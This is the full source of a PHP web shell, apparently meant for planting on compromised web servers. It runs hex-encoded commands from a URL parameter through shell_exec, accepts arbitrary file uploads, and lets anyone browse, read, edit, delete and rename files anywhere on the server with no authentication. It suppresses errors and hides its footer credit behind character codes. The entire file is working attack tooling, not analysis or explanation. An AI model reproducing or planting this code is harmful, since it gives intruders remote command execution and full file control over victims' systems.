<?php
@set_time_limit(0);
@error_reporting(0);

// 🔐 Title
function omega($len = 5) {
    $emojis = ['😸','😹','😻','😼','😽','🙀','😿','😾'];
    $str = '';
    for ($i = 0; $i < $len; $i++) {
        $str .= $emojis[array_rand($emojis)];
    }
    return $str;
}
$title = omega();

// 🔐 Hex encode
function hexenc($s) {
    return bin2hex($s);
}

// 🔐 Hex exec
function hexexec($h) {
    $bin = @hex2bin($h);
    if ($bin !== false) {
        $out = shell_exec($bin);
        if (is_null($out)) {
            echo "<div style='color:red'>Fail</div>";
        } else {
            echo "<pre style='color:lime;background:#111;padding:10px;border:1px solid #444'>" . htmlspecialchars($out) . "</pre>";
        }
    } else {
        echo "<div style='color:red'>Bad hex</div>";
    }
}

// 🚀 run
if (!empty($_GET['cmd'])) {
    hexexec($_GET['cmd']);
}

// strip magic quotes
if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) {
    foreach ($_POST as $k => $v) {
        $_POST[$k] = stripslashes($v);
    }
}

// perms
function perms($f) {
    $p = @fileperms($f);
    $o = ((($p & 0xC000) === 0xC000) ? 's' : (((($p & 0xA000) === 0xA000) ? 'l' : '-')));
    $modes = [
        '0100' => 'r','0080' => 'w','0040' => 'x',
        '0020' => 'r','0010' => 'w','0008' => 'x',
        '0004' => 'r','0002' => 'w','0001' => 'x'
    ];
    foreach ($modes as $mask => $char) {
        $o .= (($p & hexdec($mask)) ? $char : '-');
    }
    return $o;
}

// cwd safely
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$rp = @realpath($path);
if ($rp !== false && @is_dir($rp)) {
    @chdir($rp);
    $path = str_replace('\\', '/', $rp);
} else {
    $path = getcwd();
}
$parts = explode('/', $path);
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title><?php echo htmlspecialchars($title); ?></title>
<style>
body{background:#222;color:#ccc;font-family:monospace;font-size:13px;margin:0;padding:0}
a{color:#f90;text-decoration:none}
textarea,input,select{background:#111;color:#0f0;border:1px solid #444;padding:3px}
h1{text-align:center;font-size:26px;color:#0f0}
th{background:#333;color:#fff}
td,th{padding:4px}
tr:hover{background:#333}
</style>
</head>
<body>
<h1><?php echo htmlspecialchars($title); ?></h1>
<div style="padding:5px">Dir:
<?php foreach ($parts as $i => $p) {
    $u = implode('/', array_slice($parts, 0, $i + 1));
    echo "<a href='?path=" . urlencode($u) . "'>" . htmlspecialchars($p) . "</a>/";
} ?>
</div>
<form method="get" style="margin:10px">
    <input type="text" name="cmd" placeholder="HexCMD" style="width:70%">
    <input type="submit" value="Go">
</form>
<form method="post" enctype="multipart/form-data" style="margin:10px">
    <input type="file" name="f">
    <input type="submit" value="Up">
</form>
<?php
if (!empty($_FILES['f'])) {
    $F = $_FILES['f'];
    if (@move_uploaded_file($F['tmp_name'], "{$path}/{$F['name']}") === true) {
        echo "<div style='color:lime'>OK</div>";
    } else {
        echo "<div style='color:red'>NO</div>";
    }
}
// view/edit/delete/rename
if (!empty($_GET['filesrc'])) {
    $A = $_GET['filesrc'];
    echo "<h3>" . basename($A) . "</h3>";
    echo "<textarea readonly style='width:98%;height:300px'>" . htmlspecialchars(@file_get_contents($A)) . "</textarea>";
} elseif (isset($_GET['option']) && isset($_POST['opt'])) {
    $o = $_POST['opt'];
    $P = $_POST['path'];
    $t = $_POST['type'];
    if ($o === 'delete') {
        $res = ($t === 'file') ? @unlink($P) : @rmdir($P);
        echo $res ? "<div style='color:lime'>OK</div>" : "<div style='color:red'>NO</div>";
    }
    if ($o === 'rename' && isset($_POST['new'])) {
        $res = @rename($P, dirname($P) . "/" . $_POST['new']);
        echo $res ? "<div style='color:lime'>OK</div>" : "<div style='color:red'>NO</div>";
    }
    if ($o === 'edit' && isset($_POST['src'])) {
        $res = @file_put_contents($P, $_POST['src']);
        echo $res !== false ? "<div style='color:lime'>OK</div>" : "<div style='color:red'>NO</div>";
    }
    if ($o === 'edit') {
        $C = htmlspecialchars(@file_get_contents($P));
        echo "<form method='post'><textarea name='src' style='width:98%;height:300px'>{$C}</textarea>";
        echo "<input type='hidden' name='path' value='{$P}'>";
        echo "<input type='hidden' name='opt' value='edit'>";
        echo "<input type='hidden' name='type' value='file'><br><input type='submit' value='Save'></form>";
    } elseif ($o === 'rename') {
        echo "<form method='post'>New:<input name='new' value='" . basename($P) . "'>";
        echo "<input type='hidden' name='path' value='{$P}'>";
        echo "<input type='hidden' name='opt' value='rename'>";
        echo "<input type='hidden' name='type' value='{$t}'><input type='submit' value='Go'></form>";
    }
}
// list
echo "<table width='100%' border='1'><tr><th>Name</th><th>Sz</th><th>Pr</th><th>Mod</th><th>Act</th></tr>";
foreach (@scandir($path) as $e) if ($e != '.' && $e != '..') {
    $Q = "{$path}/{$e}";
    $M = date('Y-m-d H:i', @filemtime($Q));
    $R = perms($Q);
    $S = @is_dir($Q) ? '--' : (@filesize($Q) >= 1024 ? round(@filesize($Q)/1024, 2) . 'K' : @filesize($Q) . 'B');
    echo "<tr><td>[" . (@is_dir($Q) ? 'D' : 'F') . "]<a href='" . (@is_dir($Q) ? '?path=' . urlencode($Q) : '?filesrc=' . urlencode($Q)) . "'>" . htmlspecialchars($e) . "</a></td><td>{$S}</td><td>{$R}</td><td>{$M}</td><td>";
    echo "<form method='post' action='?option'><select name='opt'><option value=''>-</option><option value='edit'>E</option><option value='delete'>D</option><option value='rename'>R</option></select><input type='hidden' name='type' value='" . (@is_dir($Q) ? 'dir' : 'file') . "'><input type='hidden' name='path' value='{$Q}'><input type='submit' value='>'></form>";
    echo "</td></tr>";
}
echo "</table>";
?>
<!-- nyan -->
<div style="position:fixed;bottom:0;right:0;padding:5px;color:#666;font-size:11px">
    <?php echo implode('', array_map('chr', [67,111,100,101,100,32,98,121,32,46,47,110,121,97,110])); ?>
</div>
</body>
</html>
